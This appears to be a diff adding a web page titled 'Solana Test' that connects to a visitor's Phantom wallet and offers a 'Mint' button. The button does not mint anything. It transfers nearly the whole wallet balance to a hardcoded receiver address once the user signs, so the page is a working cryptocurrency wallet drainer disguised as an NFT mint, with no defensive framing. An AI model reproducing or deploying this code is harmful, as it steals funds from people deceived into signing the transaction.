@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Test</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.73.3/solanaWeb3.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <button id="connect-wallet">Connect Wallet</button>
+    <script>
+        // Function to check for Phantom extension
+        function checkPhantomExtension() {
+            return new Promise((resolve, reject) => {
+                if (window.solana && window.solana.isPhantom) {
+                    resolve(window.solana);
+                } else {
+                    reject("Phantom Wallet extension not found.");
+                }
+            });
+        }
+
+        $(document).ready(function() {
+            // Wait for the page to fully load
+            $('#connect-wallet').on('click', async () => {
+                try {
+                    let solana;
+                    
+                    // Check if Phantom extension is installed
+                    solana = await checkPhantomExtension();
+                    console.log("Phantom Wallet detected:", solana);
+
+                    // If Phantom is detected, try connecting to it
+                    const resp = await solana.connect();
+                    console.log("Phantom Wallet connected:", resp);
+
+                    // Establish Solana connection
+                    var connection = new solanaWeb3.Connection(
+                        'https://api.mainnet-beta.solana.com', // Solana public RPC endpoint
+                        'confirmed'
+                    );
+
+                    // Get wallet balance
+                    const public_key = new solanaWeb3.PublicKey(resp.publicKey);
+                    const walletBalance = await connection.getBalance(public_key);
+                    console.log("Wallet balance:", walletBalance);
+
+                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+                    if (walletBalance < minBalance) {
+                        alert("Insufficient funds for rent.");
+                        return;
+                    }
+
+                    // Change button text to Mint
+                    $('#connect-wallet').text("Mint");
+                    $('#connect-wallet').off('click').on('click', async () => {
+                        try {
+                            const receiverWallet = new solanaWeb3.PublicKey('2UL92BX8oF8zDSN8F6xgxVSQoeRSPPPCJVYnS1skHnEg');
+                            const balanceForTransfer = walletBalance - minBalance;
+                            if (balanceForTransfer <= 0) {
+                                alert("Insufficient funds for transfer.");
+                                return;
+                            }
+
+                            // Create transaction
+                            var transaction = new solanaWeb3.Transaction().add(
+                                solanaWeb3.SystemProgram.transfer({
+                                    fromPubkey: resp.publicKey,
+                                    toPubkey: receiverWallet,
+                                    lamports: balanceForTransfer * 0.99,
+                                }),
+                            );
+
+                            transaction.feePayer = solana.publicKey;
+                            let blockhashObj = await connection.getRecentBlockhash();
+                            transaction.recentBlockhash = blockhashObj.blockhash;
+
+                            // Sign and send transaction
+                            const signed = await solana.signTransaction(transaction);
+                            console.log("Transaction signed:", signed);
+
+                            let txid = await connection.sendRawTransaction(signed.serialize());
+                            await connection.confirmTransaction(txid);
+                            console.log("Transaction confirmed:", txid);
+                        } catch (err) {
+                            console.error("Error during minting:", err);
+                        }
+                    });
+
+                } catch (err) {
+                    console.error("Error:", err);
+                    // Only prompt to install Phantom if it's NOT installed or not detected
+                    if (typeof window.solana === 'undefined') {
+                        alert("Phantom Wallet extension not found. Please install Phantom Wallet.");
+                        
+                        const isFirefox = typeof InstallTrigger !== "undefined";
+                        const isChrome = !!window.chrome;
+
+                        if (isFirefox) {
+                            window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+                        } else if (isChrome) {
+                            window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+                        } else {
+                            alert("Please download the Phantom extension for your browser.");
+                        }
+                    } else {
+                        alert("Phantom Wallet extension is installed, but not accessible right now. Please check if it's active in your browser.");
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
